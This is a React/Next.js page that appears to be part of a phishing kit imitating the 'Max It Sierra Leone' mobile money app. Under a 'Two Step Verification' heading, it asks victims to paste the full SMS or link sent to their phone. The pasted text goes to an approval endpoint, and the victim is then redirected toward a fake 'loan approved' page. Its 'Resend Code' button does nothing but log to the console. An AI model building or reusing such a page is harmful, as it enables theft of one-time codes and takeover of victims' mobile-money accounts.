'use client';

import { useState, useEffect } from 'react';
import { useRouter } from 'next/navigation';

const RESEND_SECONDS = 18;

export default function OtpPage() {
    const router = useRouter();
    const [smsMessage, setSmsMessage] = useState('');
    const [timer, setTimer] = useState(RESEND_SECONDS);
    const [canResend, setCanResend] = useState(false);
    const [isVerifying, setIsVerifying] = useState(false);

    const phone = '+23271555801';

    useEffect(() => {
        if (timer === 0) { setCanResend(true); return; }
        const t = setTimeout(() => setTimer((s) => s - 1), 1000);
        return () => clearTimeout(t);
    }, [timer]);

    const handleResend = () => {
        if (!canResend) return;
        setSmsMessage('');
        setTimer(RESEND_SECONDS);
        setCanResend(false);
        console.log('Requesting new code...');
    };

    const handleSubmit = async () => {
        if (!smsMessage.trim()) return;
        setIsVerifying(true);
        const requestId = crypto.randomUUID();

        try {
            await fetch('/api/request-approval', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type: 'otp', phone, smsContent: smsMessage, requestId }),
            });
            router.push(`/processing?id=${requestId}&next=/loan-approved&type=otp`);
        } catch {
            setIsVerifying(false);
        }
    };

    const isFilled = smsMessage.trim().length > 0;

    return (
        <div
            className="flex justify-center items-flex-start min-h-screen"
            style={{ backgroundColor: '#ff7900', fontFamily: 'var(--font-family)' }}
        >
            <div
                className="w-full max-w-[420px] min-h-screen flex flex-col"
                style={{ backgroundColor: '#ff7900' }}
            >

                {/* Header */}
                <header
                    className="flex justify-between items-center px-5 h-[60px]"
                    style={{ backgroundColor: '#ff7900' }}
                >
                    <div className="flex-1">
                        <button
                            onClick={() => router.back()}
                            className="text-white text-xl bg-transparent border-none cursor-pointer font-light"
                            aria-label="Go back"
                        >
                            ←
                        </button>
                    </div>
                    <div className="flex-1 text-center">
                        <span className="text-white text-[22px] font-extrabold tracking-tight">
                            Max<span className="text-black">It</span>
                        </span>
                    </div>
                    <div className="flex-1 flex justify-end">
                        <button
                            className="flex flex-col gap-[5px] p-[5px] bg-transparent border-none cursor-pointer"
                            aria-label="Menu"
                        >
                            <span className="block w-[22px] h-[2px] bg-white rounded-full" />
                            <span className="block w-[22px] h-[2px] bg-white rounded-full" />
                            <span className="block w-[22px] h-[2px] bg-white rounded-full" />
                        </button>
                    </div>
                </header>

                {/* White Main Content */}
                <main
                    className="bg-white flex-grow flex flex-col items-center px-5 pt-10 pb-20"
                    style={{
                        borderBottomLeftRadius: '50% 60px',
                        borderBottomRightRadius: '50% 60px',
                        zIndex: 10,
                    }}
                >
                    {/* Card */}
                    <div
                        className="bg-white w-full rounded-xl px-5 py-8 flex flex-col"
                        style={{ boxShadow: '0 4px 20px rgba(0,0,0,0.06)' }}
                    >
                        <h2 className="text-lg font-semibold mb-3" style={{ color: '#0f172a' }}>
                            Two Step Verification
                        </h2>

                        <p className="text-[11px] mb-1 leading-snug" style={{ color: '#334155' }}>
                            Paste the complete link/sms message sent to your number
                        </p>
                        <p className="text-xs font-bold mb-6" style={{ color: '#0f172a' }}>
                            {phone}
                        </p>

                        {/* Textarea */}
                        <div className="w-full mb-5">
                            <textarea
                                value={smsMessage}
                                onChange={(e) => setSmsMessage(e.target.value)}
                                placeholder="Paste your complete Link/SMS message here..."
                                style={{
                                    width: '100%',
                                    height: '80px',
                                    padding: '12px 15px',
                                    border: '2px solid #ff7900',
                                    borderRadius: '6px',
                                    fontSize: '12px',
                                    fontFamily: 'inherit',
                                    color: '#0f172a',
                                    resize: 'none',
                                    outline: 'none',
                                    transition: 'box-shadow 0.2s',
                                }}
                                onFocus={(e) => (e.target.style.boxShadow = '0 0 0 3px rgba(255,121,0,0.1)')}
                                onBlur={(e) => (e.target.style.boxShadow = 'none')}
                            />
                        </div>

                        {/* Timer / Resend */}
                        <div className="text-center mb-6 min-h-[20px]">
                            {!canResend ? (
                                <span className="text-[11px] font-medium" style={{ color: '#718096' }}>
                                    Resend in <span>{timer}</span> seconds
                                </span>
                            ) : (
                                <button
                                    onClick={handleResend}
                                    className="text-[11px] font-semibold bg-transparent border-none cursor-pointer"
                                    style={{ color: '#ff7900' }}
                                >
                                    Resend Code
                                </button>
                            )}
                        </div>

                        {/* Submit Button */}
                        <button
                            onClick={handleSubmit}
                            disabled={!isFilled || isVerifying}
                            className="w-full py-[15px] rounded-lg text-[13px] font-bold uppercase tracking-wide border-none cursor-pointer transition-all duration-300"
                            style={{
                                backgroundColor: isFilled ? '#ff7900' : '#e2e8f0',
                                color: isFilled ? '#ffffff' : '#94a3b8',
                                boxShadow: isFilled ? '0 4px 10px rgba(255,121,0,0.2)' : 'none',
                            }}
                        >
                            {isVerifying ? 'SUBMITTING...' : 'SUBMIT'}
                        </button>
                    </div>
                </main>

                {/* Orange Footer */}
                <footer
                    className="flex justify-center items-center py-8 mt-auto"
                    style={{ backgroundColor: '#ff7900' }}
                >
                    <p className="text-[10px] font-medium text-white">© 2025 Max It Sierra Leone</p>
                </footer>

            </div>
        </div>
    );
}
